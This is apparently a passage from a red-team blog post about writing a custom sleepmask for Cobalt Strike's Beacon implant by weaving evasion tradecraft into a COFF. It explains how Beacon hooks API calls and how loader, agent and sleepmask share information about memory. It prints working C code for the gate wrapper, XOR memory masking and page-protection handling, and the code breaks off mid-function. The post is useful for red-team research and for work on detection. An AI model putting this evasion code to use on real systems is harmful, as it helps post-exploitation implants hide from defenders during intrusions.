---
title: Crystal Mask
url: https://rastamouse.me/crystal-mask/
source: Rasta Mouse
date: 2026-04-09
fetch_date: 2026-04-10T04:47:45.544907
---

# Crystal Mask

[Rasta Mouse](https://rastamouse.me)

* [Home](https://rastamouse.me/)

09 Apr 2026

8 min read

# Crystal Mask

The goal of Crystal Palace (and the Tradecraft Garden) is to separate evasion tradecraft from the capability. This means that a capability (such as a DLL) has no evasion built into it; and that evasion is weaved in at link-time in a manner that the capability is not aware of (nor designed to accommodate). The primary advantage of this philosophy is that you can swap different tradecraft in and out, without having to rebuild the entire capability.

Cobalt Strike's post-exploitation agent, Beacon, is designed for users to leverage their own evasion tradecraft, but it does so in a fundamentally different way. Beacon's sleepmask is a BOF, which Beacon explicitly calls into when it wants to execute a Win32 API that's supported by [BeaconGate](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-gate.htm). This is therefore evasion that Beacon is aware of and acommodates.

Crystal Kit was my experiment to disable Beacon's built-in customisation options and apply evasion tradecraft via Crystal Palace's hooking primitive.

[GitHub - rasta-mouse/Crystal-Kit: Evasion kit for Cobalt Strike

Evasion kit for Cobalt Strike. Contribute to rasta-mouse/Crystal-Kit development by creating an account on GitHub.

![](https://static.ghost.org/v5.0.0/images/link-icon.svg)GitHubrasta-mouse

![](https://opengraph.githubassets.com/e5cc220579129d24957b26b086d8d31fc8ccdadfc9ea758ab073d281c7f9a8ee/rasta-mouse/Crystal-Kit)](https://github.com/rasta-mouse/Crystal-Kit)

This works by hooking Beacon's IAT and redirecting API calls to functions within a memory-loaded [PICO](https://tradecraftgarden.org/docs.html#picos). These hook functions are where evasion tradecraft, like call stack spoofing, are implemented.

Having had time and experience working with the codebase, I've started to get a good feel for some of the upsides and downsides of this approach. Without a doubt, the biggest upside is the freedom and flexibility that it provides. For instance, we can force APIs that are not supported by BeaconGate, such as CreateProcess, through evasion tradecraft because we're not constrained by what the capability (Beacon) can provide.

On the flip side, one of the downsides is the amount of extra work you have to do as a developer. This became apparent to me when implementing memory obfuscations on sleep. One of the requirements of memory obfuscation is knowing the address and size of each memory allocation that you want to mask. For a capability such as Beacon, this can be solved by passing information about memory allocations from the reflective loader. For dynamic allocations made at runtime (such as heap memory), you can hook HeapAlloc, HeapReAlloc, and HeapFree, and manually keep track of every allocation that's created, resized, and freed.

However, Beacon already has several software 'contracts' with the reflective loader and the sleepmask that make this process a whole lot easier. Beacon's default reflective loader passes information to Beacon (via [BUD](https://github.com/Cobalt-Strike/bof-vs/blob/c9b3ae2276cced9335cdc73cd4956b8a9b3b0708/BOF-Template/beacon.h#L391-L398)) about the memory that Beacon is loaded into. When Beacon calls into the sleepmask, it does so with the following function:

```
void sleep_mask ( PBEACON_INFO beacon_info, PFUNCTION_CALL function_call );
```

`FUNCTION_CALL` is a structure that contains information about what Win32 API Beacon wants to call. This could be Sleep (for standard HTTP/DNS Beacons), or another API supported by BeaconGate (such as OpenProcess).

`BEACON_INFO` is a structure that contains information about Beacon's memory allocations. This includes memory that Beacon is loaded into (provided by the reflective loader via BUD); and heap memory that Beacon has allocated for itself. That is to say, Beacon tracks its heap memory for you. There are also a few BOF APIs like `BeaconGetSyscallInformation` and `BeaconGetCustomUserData`, which support you in doing custom things in colaboration with the reflective loader.

This is pretty nice for scenarios where you may want a custom sleepmask but with the default loader - as you can just consume the information that's already available. Likewise, you could use the default sleepmask and a custom loader; or of course, completely custom loaders and sleepmasks (even made by different people). As long as these contracts are properly observed, these components will play nicely with each other.

## Basic Mask

Since the sleepmask is just a BOF (i.e. a COFF with exposure to [Beacon-specific APIs](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_bof-c-api.htm)), a question that came to my mind was: can we merge and weave custom evasion tradecraft into a COFF (à la [BOF Cocktails](https://rastamouse.me/bof-cocktails/)) and maintain the existing software contract with Beacon? Turns out, the answer is a very easy yes.

We already have access to the relevant header files thanks to the [sleepmask-vs](https://github.com/Cobalt-Strike/sleepmask-vs) project, so we just need to write a minimal implementation to mask memory, make the API call, then unmask memory.

💡

You don't actually have to mask memory at all, it's just my assumption that you'd want to.

This is my basic code in its entirety:

```
#include <windows.h>
#include "beacon.h"
#include "sleepmask.h"
#include "beacon_gate.h"
#include "tcg.h"

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );

void gate_wrapper ( PFUNCTION_CALL function_call )
{
    ULONG_PTR result = 0;

    switch ( function_call->numOfArgs )
    {
    case 0:
        result = beaconGate ( 00 ) ( );
        break;

    case 1:
        result = beaconGate ( 01 ) ( arg ( 0 ) );
        break;

    case 2:
        result = beaconGate ( 02 ) ( arg ( 0 ), arg ( 1 ) );
        break;

    case 3:
        result = beaconGate ( 03 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ) );
        break;

    case 4:
        result = beaconGate ( 04 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ) );
        break;

    case 5:
        result = beaconGate ( 05 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ), arg ( 4 ) );
        break;

    case 6:
        result = beaconGate ( 06 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ), arg ( 4 ), arg ( 5 ) );
        break;

    case 7:
        result = beaconGate ( 07 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ), arg ( 4 ), arg ( 5 ), arg ( 6 ) );
        break;

    case 8:
        result = beaconGate ( 08 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ), arg ( 4 ), arg ( 5 ), arg ( 6 ), arg ( 7 ) );
        break;

    case 9:
        result = beaconGate ( 09 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ), arg ( 4 ), arg ( 5 ), arg ( 6 ), arg ( 7 ), arg ( 8 ) );
        break;

    case 10:
        result = beaconGate ( 10 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ), arg ( 4 ), arg ( 5 ), arg ( 6 ), arg ( 7 ), arg ( 8 ), arg ( 9 ) );
        break;

    default:
        break;
    }

    function_call->retValue = result;
}

void xor ( char * buffer, size_t buffer_len, char * key, size_t key_len )
{
    for ( size_t i = 0; i < buffer_len; i++ )
    {
        buffer [ i ] ^= key [ i % key_len ];
    }
}

BOOL can_write ( DWORD protection )
{
    switch (protection)
    {
    case PAGE_EXECUTE_READWRITE:
    case PAGE_EXECUTE_WRITECOPY:
    case PAGE_READWRITE:
    case PAGE_WRITECOPY:
        return TRUE;

    default:
        return FALSE;
    }
}

void mask_section ( PALLOCATED_MEMORY_SECTION section, char * key, BOOL mask )
{
    DWORD old_protection = 0;

    // if we're masking but section not writable
    if ( mask && ! can_write ( section->CurrentProtect ) )
    {
        // make it writable
        if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->VirtualSize, PAGE_READWRITE, &old_protection ) )
     ...